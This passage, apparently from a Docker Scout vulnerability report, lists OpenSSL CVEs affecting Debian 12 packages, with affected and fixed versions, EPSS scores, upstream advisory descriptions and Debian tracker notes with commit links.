the case of ALPN the list of protocols supplied by the client is guaranteed by libssl to never be zero in length. The list of server protocols comes from the application and should never normally be expected to be of zero length. In this case if the SSL_select_next_proto function has been called as expected (with the list supplied by the client passed in the client/client_len parameters), then the application will not be vulnerable to this issue. If the application has accidentally been configured with a zero length server list, and has accidentally passed that zero length server list in the client/client_len parameters, and has additionally failed to correctly handle a "no overlap" response (which would normally result in a handshake failure in ALPN) then it will be vulnerable to this problem.  In the case of NPN, the protocol permits the client to opportunistically select a protocol when there is no overlap. OpenSSL returns the first client protocol in the no overlap case in support of this. The list of client protocols comes from the application and should never normally be expected to be of zero length. However if the SSL_select_next_proto function is accidentally called with a client_len of 0 then an invalid memory pointer will be returned instead. If the application uses this output as the opportunistic protocol then the loss of confidentiality will occur.  This issue has been assessed as Low severity because applications are most likely to be vulnerable if they are using NPN instead of ALPN - but NPN is not widely used. It also requires an application configuration or programming error. Finally, this issue would not typically be under attacker control making active exploitation unlikely.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.  Due to the low severity of this issue we are not issuing new releases of OpenSSL at this time. The fix will be included in the next releases when they become available.

---
- openssl 3.3.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1074487)
[bookworm] - openssl 3.0.15-1~deb12u1
https://www.openssl.org/news/secadv/20240627.txt
https://github.com/openssl/openssl/commit/2ebbe2d7ca8551c4cb5fbb391ab9af411708090e
https://github.com/openssl/openssl/commit/c6e1ea223510bb7104bf0c41c0c45eda5a16b718
https://github.com/openssl/openssl/commit/fc8ff75814767d6c55ea78d05adc72cd346d0f0a
https://github.com/openssl/openssl/commit/a210f580f450bbd08fac85f06e27107b8c580f9b
https://github.com/openssl/openssl/commit/0d883f6309b6905d29ffded6d703ded39385579c
https://github.com/openssl/openssl/commit/9925c97a8e8c9887765a0979c35b516bc8c3af85
https://github.com/openssl/openssl/commit/e10a3a84bf73a3e6024c338b51f2fb4e78a3dee9
https://github.com/openssl/openssl/commit/238fa464d6e38aa2c92af70ef9580c74cff512e4
https://github.com/openssl/openssl/commit/de71058567b84c6e14b758a383e1862eb3efb921
https://github.com/openssl/openssl/commit/214c724e00d594c3eecf4b740ee7af772f0ee04a

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9230?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.17-1%7Edeb12u3"><img alt="high : CVE--2025--9230" src="https://img.shields.io/badge/CVE--2025--9230-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.17-1~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.17-1~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An application trying to decrypt CMS messages encrypted using password based encryption can trigger an out-of-bounds read and write.  Impact summary: This out-of-bounds read may trigger a crash which leads to Denial of Service for an application. The out-of-bounds write can cause a memory corruption which can have various consequences including a Denial of Service or Execution of attacker-supplied code.  Although the consequences of a successful exploit of this vulnerability could be severe, the probability that the attacker would be able to perform it is low. Besides, password based (PWRI) encryption support in CMS messages is very rarely used. For that reason the issue was assessed as Moderate severity according to our Security Policy.  The FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue, as the CMS implementation is outside the OpenSSL FIPS module boundary.

---
- openssl 3.5.4-1
https://openssl-library.org/news/secadv/20250930.txt
Fixed by: https://github.com/openssl/openssl/commit/5965ea5dd6960f36d8b7f74f8eac67a8eb8f2b45 (openssl-3.3.5)
Fixed by: https://github.com/openssl/openssl/commit/9e91358f365dee6c446dcdcdb01c04d2743fd280 (openssl-3.4.3)
Fixed by: https://github.com/openssl/openssl/commit/b5282d677551afda7d20e9c00e09561b547b2dfd (openssl-3.2.6)
Fixed by: https://github.com/openssl/openssl/commit/a79c4ce559c6a3a8fd4109e9f33c1185d5bf2def (openssl-3.0.18)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-4741?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.14-1%7Edeb12u1"><img alt="high : CVE--2024--4741" src="https://img.shields.io/badge/CVE--2024--4741-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.14-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.14-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.238%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause memory to be accessed that was previously freed in some situations  Impact summary: A use after free can have a range of potential consequences such as the corruption of valid data, crashes or execution of arbitrary code. However, only applications that directly call the SSL_free_buffers function are affected by this issue. Applications that do not call this function are not vulnerable. Our investigations indicate that this function is rarely used by applications.  The SSL_free_buffers function is used to free the internal OpenSSL buffer used when processing an incoming record from the network. The call is only expected to succeed if the buffer is not currently in use. However, two scenarios have been identified where the buffer is freed even when still in use.  The first scenario occurs where a record header has been received from the network and processed by OpenSSL, but the full record body has not yet arrived. In this case calling SSL_free_buffers will succeed even though a record has only been partially processed and the buffer is still in use.  The second scenario occurs where a full record containing application data has been received and processed by OpenSSL but the application has only read part of this data. Again a call to SSL_free_buffers will succeed even though the buffer is still in use.  While these scenarios could occur accidentally during normal operation a malicious attacker could attempt to engineer a stituation where this occurs. We are not aware of this issue being actively exploited.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

---
- openssl 3.2.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1072113)
[bookworm] - openssl 3.0.14-1~deb12u1
[buster] - openssl <postponed> (Minor issue, fix along with next update round)
https://www.openssl.org/news/secadv/20240528.txt
https://github.com/openssl/openssl/commit/c1bd38a003fa19fd0d8ade85e1bbc20d8ae59dab (master)
https://github.com/openssl/openssl/commit/c88c3de51020c37e8706bf7a682a162593053aac (openssl-3.2)
https://github.com/openssl/openssl/commit/b3f0eb0a295f58f16ba43ba99dad70d4ee5c437d (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2511?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.14-1%7Edeb12u1"><img alt="medium : CVE--2024--2511" src="https://img.shields.io/badge/CVE--2024--2511-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.14-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.14-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>4.697%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Some non-default TLS server configurations can cause unbounded memory growth when processing TLSv1.3 sessions  Impact summary: An attacker may exploit certain server configurations to trigger unbounded memory growth that would lead to a Denial of Service  This problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is being used (but not if early_data support is also configured and the default anti-replay protection is in use). In this case, under certain conditions, the session cache can get into an incorrect state and it will fail to flush properly as it fills. The session cache will continue to grow in an unbounded manner. A malicious client could deliberately create the scenario for this failure to force a Denial of Service. It may also happen by accident in normal operation.  This issue only affects TLS servers supporting TLSv1.3. It does not affect TLS clients.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL 1.0.2 is also not affected by this issue.

---
[experimental] - openssl 3.3.0-1
- openssl 3.2.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068658)
[bookworm] - openssl 3.0.14-1~deb12u1
[buster] - openssl <postponed> (Minor issue, fix along with next update round)
https://www.openssl.org/news/secadv/20240408.txt
https://github.com/openssl/openssl/commit/e9d7083e241670332e0443da0f0d4ffb52829f08 (openssl-3.2.y)
https://github.com/openssl/openssl/commit/7e4d731b1c07201ad9374c1cd9ac5263bdf35bce (openssl-3.1.y)
https://github.com/openssl/openssl/commit/b52867a9f618bb955bed2a3ce3db4d4f97ed8e5d (openssl-3.0.y)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-0727?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.13-1%7Edeb12u1"><img alt="medium : CVE--2024--0727" src="https://img.shields.io/badge/CVE--2024--0727-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.13-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.13-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.189%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.

---
- openssl 3.1.5-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061582)
[bookworm] - openssl 3.0.13-1~deb12u1
[buster] - openssl <postponed> (Minor issue, DoS, Low severity)
https://www.openssl.org/news/secadv/20240125.txt
https://github.com/openssl/openssl/commit/041962b429ebe748c8b6b7922980dfb6decfef26 (master)
https://github.com/openssl/openssl/commit/8a85df7c60ba1372ee98acc5982e902d75f52130 (master)
https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c (openssl-3.1.5)
https://github.com/openssl/openssl/commit/febb086d0fc1ea12181f4d833aa9b8fdf2133b3b (openssl-3.1.5)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-5678?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.13-1%7Edeb12u1"><img alt="medium : CVE--2023--5678" src="https://img.shields.io/badge/CVE--2023--5678-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.13-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.13-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.638%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Generating excessively long X9.42 DH keys or checking excessively long X9.42 DH keys or parameters may be very slow.  Impact summary: Applications that use the functions DH_generate_key() to generate an X9.42 DH key may experience long delays.  Likewise, applications that use DH_check_pub_key(), DH_check_pub_key_ex() or EVP_PKEY_public_check() to check an X9.42 DH key or X9.42 DH parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  While DH_check() performs all the necessary checks (as of CVE-2023-3817), DH_check_pub_key() doesn't make any of these checks, and is therefore vulnerable for excessively large P and Q parameters.  Likewise, while DH_generate_key() performs a check for an excessively large P, it doesn't check for an excessively large Q.  An application that calls DH_generate_key() or DH_check_pub_key() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  DH_generate_key() and DH_check_pub_key() are also called by a number of other OpenSSL functions.  An application calling any of those other functions may similarly be affected.  The other functions affected by this are DH_check_pub_key_ex(), EVP_PKEY_public_check(), and EVP_PKEY_generate().  Also vulnerable are the OpenSSL pkey command line application when using the "-pubcheck" option, as well as the OpenSSL genpkey command line application.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.

---
- openssl 3.0.12-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1055473)
[bookworm] - openssl 3.0.13-1~deb12u1
[buster] - openssl <postponed> (Minor issue; can be fixed along with future update)
https://www.openssl.org/news/secadv/20231106.txt
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=db925ae2e65d0d925adef429afc37f75bd1c2017 (for 3.0.y)
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=710fee740904b6290fef0dd5536fbcedbc38ff0c (for 1.1.1y)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-9143?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.15-1%7Edeb12u1"><img alt="medium : CVE--2024--9143" src="https://img.shields.io/badge/CVE--2024--9143-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.15-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.15-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.639%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Use of the low-level GF(2^m) elliptic curve APIs with untrusted explicit values for the field polynomial can lead to out-of-bounds memory reads or writes.  Impact summary: Out of bound memory writes can lead to an application crash or even a possibility of a remote code execution, however, in all the protocols involving Elliptic Curve Cryptography that we're aware of, either only "named curves" are supported, or, if explicit curve parameters are supported, they specify an X9.62 encoding of binary (GF(2^m)) curves that can't represent problematic input values. Thus the likelihood of existence of a vulnerable application is low.  In particular, the X9.62 encoding is used for ECC keys in X.509 certificates, so problematic inputs cannot occur in the context of processing X.509 certificates.  Any problematic use-cases would have to be using an "exotic" curve encoding.  The affected APIs include: EC_GROUP_new_curve_GF2m(), EC_GROUP_new_from_params(), and various supporting BN_GF2m_*() functions.  Applications working with "exotic" explicit binary (GF(2^m)) curve parameters, that make it possible to represent invalid field polynomials with a zero constant term, via the above or similar APIs, may terminate abruptly as a result of reading or writing outside of array bounds.  Remote code execution cannot easily be ruled out.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

---
[experimental] - openssl 3.4.0-1
- openssl 3.3.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1085378)
[bookworm] - openssl 3.0.15-1~deb12u1
https://openssl-library.org/news/secadv/20241016.txt
https://github.com/openssl/openssl/commit/c0d3e4d32d2805f49bec30547f225bc4d092e1f4 (openssl-3.3)
https://github.com/openssl/openssl/commit/72ae83ad214d2eef262461365a1975707f862712 (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-13176?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.16-1%7Edeb12u1"><img alt="medium : CVE--2024--13176" src="https://img.shields.io/badge/CVE--2024--13176-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.16-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.16-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.123%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: A timing side-channel which could potentially allow recovering the private key exists in the ECDSA signature computation.  Impact summary: A timing side-channel in ECDSA signature computations could allow recovering the private key by an attacker. However, measuring the timing would require either local access to the signing application or a very fast network connection with low latency.  There is a timing signal of around 300 nanoseconds when the top word of the inverted ECDSA nonce value is zero. This can happen with significant probability only for some of the supported elliptic curves. In particular the NIST P-521 curve is affected. To be able to measure this leak, the attacker process must either be located in the same physical computer or must have a very fast network connection with low latency. For that reason the severity of this vulnerability is Low.  The FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.

---
- openssl 3.4.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1094027)
[bookworm] - openssl 3.0.16-1~deb12u1
- edk2 2025.02-9
[trixie] - edk2 2025.02-8+deb13u1
[bookworm] - edk2 <no-dsa> (Minor issue)
https://openssl-library.org/news/secadv/20250120.txt
https://github.com/openssl/openssl/commit/77c608f4c8857e63e98e66444e2e761c9627916f (openssl-3.4.1)
https://github.com/openssl/openssl/commit/392dcb336405a0c94486aa6655057f59fd3a0902 (openssl-3.3.3)
https://github.com/openssl/openssl/commit/4b1cb94a734a7d4ec363ac0a215a25c181e11f65 (openssl-3.2.4)
https://github.com/openssl/openssl/commit/2af62e74fb59bc469506bc37eb2990ea408d9467 (openssl-3.1.8)
https://github.com/openssl/openssl/commit/07272b05b04836a762b4baa874958af51d513844 (openssl-3.0.16)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9232?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.17-1%7Edeb12u3"><img alt="low : CVE--2025--9232" src="https://img.shields.io/badge/CVE--2025--9232-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.17-1~deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.17-1~deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: An application using the OpenSSL HTTP client API functions may trigger an out-of-bounds read if the 'no_proxy' environment variable is set and the host portion of the authority component of the HTTP URL is an IPv6 address.  Impact summary: An out-of-bounds read can trigger a crash which leads to Denial of Service for an application.  The OpenSSL HTTP client API functions can be used directly by applications but they are also used by the OCSP client functions and CMP (Certificate Management Protocol) client implementation in OpenSSL. However the URLs used by these implementations are unlikely to be controlled by an attacker.  In this vulnerable code the out of bounds read can only trigger a crash. Furthermore the vulnerability requires an attacker-controlled URL to be passed from an application to the OpenSSL function and the user has to have a 'no_proxy' environment variable set. For the aforementioned reasons the issue was assessed as Low severity.  The vulnerable code was introduced in the following patch releases: 3.0.16, 3.1.8, 3.2.4, 3.3.3, 3.4.0 and 3.5.0.  The FIPS modules in 3.5, 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue, as the HTTP client implementation is outside the OpenSSL FIPS module boundary.

---
- openssl 3.5.4-1
[bullseye] - openssl <not-affected> (Vulnerable code not present)
https://openssl-library.org/news/secadv/20250930.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-27587?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D3.0.18-1%7Edeb12u1"><img alt="low : CVE--2025--27587" src="https://img.shields.io/badge/CVE--2025--27587-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=3.0.18-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.046%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 3.0.0 through 3.3.2 on the PowerPC architecture is vulnerable to a Minerva attack, exploitable by measuring the time of signing of random messages using the EVP_DigestSign API, and then using the private key to extract the K value (nonce) from the signatures. Next, based on the bit size of the extracted nonce, one can compare the signing time of full-sized nonces to signatures that used smaller nonces, via statistical tests. There is a side-channel in the P-364 curve that allows private key extraction (also, there is a dependency between the bit size of K and the size of the side channel). NOTE: This CVE is disputed because the OpenSSL security policy explicitly notes that any side channels which require same physical system to be detected are outside of the threat model for the software. The timing signal is so small that it is infeasible to be detected without having the attacking process running on the same physical system.

---
- openssl 3.5.0-1 (unimportant)
https://github.com/openssl/openssl/issues/24253
https://github.com/openssl/openssl/commit/85cabd94958303859b1551364a609d4ff40b67a5 (master)
https://github.com/openssl/openssl/commit/080c6be0b102934bf66daeac70f0863f209f8d0f (openssl-3.5.0-beta1)
https://github.com/openssl/openssl/issues/24253#issuecomment-2144391562
Not considered a vulnerability by OpenSSL upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6119?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.14-1%7Edeb12u2"><img alt="low : CVE--2024--6119" src="https://img.shields.io/badge/CVE--2024--6119-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.14-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.14-1~deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>4.969%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>89th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Applications performing certificate name checks (e.g., TLS clients checking server certificates) may attempt to read an invalid memory address resulting in abnormal termination of the application process.  Impact summary: Abnormal termination of an application can a cause a denial of service.  Applications performing certificate name checks (e.g., TLS clients checking server certificates) may attempt to read an invalid memory address when comparing the expected name with an `otherName` subject alternative name of an X.509 certificate. This may result in an exception that terminates the application program.  Note that basic certificate chain validation (signatures, dates, ...) is not affected, the denial of service can occur only when the application also specifies an expected DNS name, Email address or IP address.  TLS servers rarely solicit client certificates, and even when they do, they generally don't perform a name check against a reference identifier (expected identity), but rather extract the presented identity after checking the certificate chain.  So TLS servers are generally not affected and the severity of the issue is Moderate.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.

---
- openssl 3.3.2-1
[bullseye] - openssl <not-affected> (Vulnerable code not present)
https://openssl-library.org/news/secadv/20240903.txt
https://github.com/openssl/openssl/commit/06d1dc3fa96a2ba5a3e22735a033012aadc9f0d6 (openssl-3.0.15)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-4603?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.14-1%7Edeb12u1"><img alt="low : CVE--2024--4603" src="https://img.shields.io/badge/CVE--2024--4603-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.14-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.14-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Checking excessively long DSA keys or parameters may be very slow.  Impact summary: Applications that use the functions EVP_PKEY_param_check() or EVP_PKEY_public_check() to check a DSA public key or DSA parameters may experience long delays. Where the key or parameters that are being checked have been obtained from an untrusted source this may lead to a Denial of Service.  The functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform various checks on DSA parameters. Some of those computations take a long time if the modulus (`p` parameter) is too large.  Trying to use a very large modulus is slow and OpenSSL will not allow using public keys with a modulus which is over 10,000 bits in length for signature verification. However the key and parameter check functions do not limit the modulus size when performing the checks.  An application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check() and supplies a key or parameters obtained from an untrusted source could be vulnerable to a Denial of Service attack.  These functions are not called by OpenSSL itself on untrusted DSA keys so only applications that directly call these functions may be vulnerable.  Also vulnerable are the OpenSSL pkey and pkeyparam command line applications when using the `-check` option.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.

---
- openssl 3.2.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071972)
[bookworm] - openssl 3.0.14-1~deb12u1
[bullseye] - openssl <not-affected> (Vulnerable code not present)
[buster] - openssl <not-affected> (Vulnerable code not present)
https://www.openssl.org/news/secadv/20240516.txt
https://github.com/openssl/openssl/commit/da343d0605c826ef197aceedc67e8e04f065f740 (openssl-3.2)
https://github.com/openssl/openssl/commit/9c39b3858091c152f52513c066ff2c5a47969f0d (openssl-3.1)
https://github.com/openssl/openssl/commit/3559e868e58005d15c6013a0c1fd832e51c73397 (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6237?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.13-1%7Edeb12u1"><img alt="low : CVE--2023--6237" src="https://img.shields.io/badge/CVE--2023--6237-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.13-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.13-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>66th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: Checking excessively long invalid RSA public keys may take a long time.  Impact summary: Applications that use the function EVP_PKEY_public_check() to check RSA public keys may experience long delays. Where the key that is being checked has been obtained from an untrusted source this may lead to a Denial of Service.  When function EVP_PKEY_public_check() is called on RSA public keys, a computation is done to confirm that the RSA modulus, n, is composite. For valid RSA keys, n is a product of two or more large primes and this computation completes quickly. However, if n is an overly large prime, then this computation would take a long time.  An application that calls EVP_PKEY_public_check() and supplies an RSA key obtained from an untrusted source could be vulnerable to a Denial of Service attack.  The function EVP_PKEY_public_check() is not called from other OpenSSL functions however it is called from the OpenSSL pkey command line application. For that reason that application is also vulnerable if used with the '-pubin' and '-check' options on untrusted data.  The OpenSSL SSL/TLS implementation is not affected by this issue.  The OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.

---
- openssl 3.1.5-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1060858)
[bookworm] - openssl 3.0.13-1~deb12u1
[bullseye] - openssl <not-affected> (Only affects 3.x)
[buster] - openssl <not-affected> (Only affects 3.x)
https://www.openssl.org/news/secadv/20240115.txt
https://github.com/openssl/openssl/commit/e09fc1d746a4fd15bb5c3d7bbbab950aadd005db
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=a830f551557d3d66a84bbb18a5b889c640c36294 (openssl-3.1)
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=18c02492138d1eb8b6548cb26e7b625fb2414a2a (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6129?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.0.13-1%7Edeb12u1"><img alt="low : CVE--2023--6129" src="https://img.shields.io/badge/CVE--2023--6129-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.0.13-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.13-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.716%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Issue summary: The POLY1305 MAC (message authentication code) implementation contains a bug that might corrupt the internal state of applications running on PowerPC CPU based platforms if the CPU provides vector instructions.  Impact summary: If an attacker can influence whether the POLY1305 MAC algorithm is used, the application state might be corrupted with various application dependent consequences.  The POLY1305 MAC (message authentication code) implementation in OpenSSL for PowerPC CPUs restores the contents of vector registers in a different order than they are saved. Thus the contents of some of these vector registers are corrupted when returning to the caller. The vulnerable code is used only on newer PowerPC processors supporting the PowerISA 2.07 instructions.  The consequences of this kind of internal application state corruption can be various - from no consequences, if the calling application does not depend on the contents of non-volatile XMM registers at all, to the worst consequences, where the attacker could get complete control of the application process. However unless the compiler uses the vector registers for storing pointers, the most likely consequence, if any, would be an incorrect result of some application dependent calculations or a crash leading to a denial of service.  The POLY1305 MAC algorithm is most frequently used as part of the CHACHA20-POLY1305 AEAD (authenticated encryption with associated data) algorithm. The most common usage of this AEAD cipher is with TLS protocol versions 1.2 and 1.3. If this cipher is enabled on the server a malicious client can influence whether this AEAD cipher is used. This implies that TLS server applications using OpenSSL can be potentially impacted. However we are currently not aware of any concrete application that would be affected by this issue therefore we consider this a Low severity security issue.

---
- openssl 3.1.5-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1060347)
[bookworm] - openssl 3.0.13-1~deb12u1
[bullseye] - openssl <not-affected> (Vulnerable code not present)
[buster] - openssl <not-affected> (Vulnerable code not present)
https://www.openwall.com/lists/oss-security/2024/01/09/1
https://www.openssl.org/news/secadv/20240109.txt
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=f3fc5808fe9ff74042d639839610d03b8fdcc015 (openssl-3.1)
https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=050d26383d4e264966fb83428e72d5d48f402d35 (openssl-3.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=12&vr=%3E%3D3.0.11-1%7Edeb12u2"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.0.11-1~deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.094%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

